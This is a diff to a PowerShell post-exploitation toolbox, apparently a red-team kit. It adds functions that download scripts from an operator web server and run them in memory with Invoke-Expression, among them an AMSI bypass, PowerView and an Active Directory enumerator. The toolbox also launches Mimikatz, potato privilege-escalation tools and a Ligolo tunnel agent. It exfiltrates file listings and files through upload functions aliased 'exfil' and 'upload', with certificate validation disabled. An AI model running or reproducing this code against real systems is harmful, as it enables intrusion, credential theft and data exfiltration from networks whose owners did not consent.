@@ -57,11 +57,22 @@ function Global:Get-SingleToolboxItem {
         [string]$item,
         [string]$name 
     )
+    Set-Location $Global:ToolboxLocation
     if (-not $name)
     {
         $name = Split-Path $item -Leaf
     }
     Invoke-WebRequest -Uri $($Global:WebServerRoot + $item) -OutFile "$Global:ToolboxLocation\$name"
+}
+
+function Global:Bypass-AMZEE {
+    [ValidateSet(1,2)]
+    [int]$method = 1
+    Load-ScriptItemInMemory -item "tools/amzeebypass$($method).ps1"
+}
+
+function Global:Load-Pview {
+    Load-ScriptItemInMemory -item 'enum/powerview.ps1'
 }
 
 function Global:Start-LigoloAgent {
@@ -102,12 +113,26 @@ function Global:Start-Shell {
     }
 }
 
+function Global:Load-ScriptItemInMemory {
+    param (
+        [string]$item,
+        [string]$Serverroot = $Global:WebServerRoot
+    )
+
+    Invoke-Expression (New-Object System.Net.Webclient).DownloadString("$($Serverroot + $item)")
+}
+
 function Global:Start-AdEnum {
     Set-Location $Global:ToolboxLocation
     Get-SingleToolboxItem -item 'enum/adenumv2.ps1'
-    Get-SingleToolboxItem -item 'enum/powerview.ps1'
     . ./adenumv2.ps1
-    . ./powerview.ps1
+    Get-AllObjectsFromAD
+    Show-SimpleReport -Path $env:tmp -user $env:USERNAME -domain $script:DName
+}
+
+function Global:Start-AdEnumInMemory {
+    Set-Location $Global:ToolboxLocation
+    Load-ScriptItemInMemory -item 'enum/adenumv2.ps1'
     Get-AllObjectsFromAD
     Show-SimpleReport -Path $env:tmp -user $env:USERNAME -domain $script:DName
 }
@@ -130,6 +155,12 @@ function Global:Start-Mimikatz {
     Set-Location $cdir
 }
 
+function Global:Get-FileListing {
+    $cdir = $(Get-Location).Path
+    $(Get-ChildItem -Path $cdir -Recurse -File).FullName | Out-File FileListing.txt
+    UploadToWebServer -filepath "$($(Get-Location).Path)\FileListing.txt"
+}
+
 function Global:Get-potatos {
     Get-ToolboxItems -m potato
     Get-ToolboxItems -m spoofer
@@ -144,21 +175,73 @@ function Global:Send-FilesHome {
         [string]$id  = $env:computername #Alternate identifier for upload machine. Dirname on web server
     )
 
-    $excluded = @('*.url','*.lnk')
+    $excluded = @('*.url','*.lnk','*.inf','*.sys','*.dat','*.inf_loc')
     if ($recurse) {        
         $files = Get-ChildItem -Recurse -Path $dir -Filter $filter -ErrorAction SilentlyContinue -File -Exclude $excluded
         foreach ($f in $files) {
             Write-Host "Freeing... $($f.fullname)"
-            UploadToWebServer -filepath $($f.FullName) -url $url -id $id
+            UploadToWebServer -filepath $($f.FullName) -url $url
         }
     }
     else {
         $files = Get-ChildItem -Path $dir -Filter $filter -ErrorAction SilentlyContinue -File -Exclude $excluded
         foreach ($f in $files) {
             Write-Host "Freeing... $($f.fullname)"
-            UploadToWebServer -filepath $($f.FullName) -url $url -id $id
+            UploadToWebServer -filepath $($f.FullName) -url $url
         }
     }
+}
+
+function Global:UploadStringToWebServer {
+    param (
+        [Parameter(Mandatory = $true)]
+        [Alias('f')]
+        [string]$filename,
+        [Parameter(Mandatory = $true)]
+        [Alias('t')]
+        [string]$string,
+        [Parameter(Mandatory = $false)]
+        [Alias('u')]$url = $Global:WebServerRoot
+    )
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } ;
+    $filename = Split-Path $FilePath -Leaf
+    $boundary = [System.Guid]::NewGuid().ToString()
+
+    foreach ($s in $String)
+    {
+        $byteArrayObject = [System.Collections.Generic.List[Byte[]]]::new()
+        try
+        {
+            $byteArray = [System.Text.Encoding]::ASCII.GetBytes($s)
+            $null = $byteArrayObject.Add($byteArray)
+        }
+        catch
+        {
+           return $null
+        }
+    }
+
+    $TheFile = $byteArrayObject
+    $TheFileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($TheFile)
+
+    $id = $env:computername
+
+    $LF = "`r`n"
+    $bodyLines = (  
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"path`"$LF",
+        '\',
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"id`"$LF",
+        $id,
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"filename`"; filename=`"$filename`"",
+        "Content-Type: application/json$LF",
+        $TheFileContent,
+        "--$boundary--$LF"
+    ) -join $LF
+
+    Invoke-RestMethod $url -Method POST -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
 }
 
 function Global:UploadToWebServer {
@@ -274,7 +357,9 @@ function Global:Get-ToolboxItems {
         [Alias('e')]
         [switch]$ExecutePS
         )
-	
+    
+        Set-Location $Global:ToolboxLocation
+
         if ($baseUrl -match '/$') {
             #url ends with slash
         }
@@ -343,6 +428,7 @@ function Global:Get-ToolboxItems {
 
 Set-PSToolboxConfig
 
+    Set-Alias -Name lsim -Value Load-ScriptItemInMemory
     Set-Alias -Name gti -Value Get-ToolBoxItems
     Set-Alias -Name upload -Value UploadToWebServer
     Set-Alias -Name exfil -Value Send-FilesHome
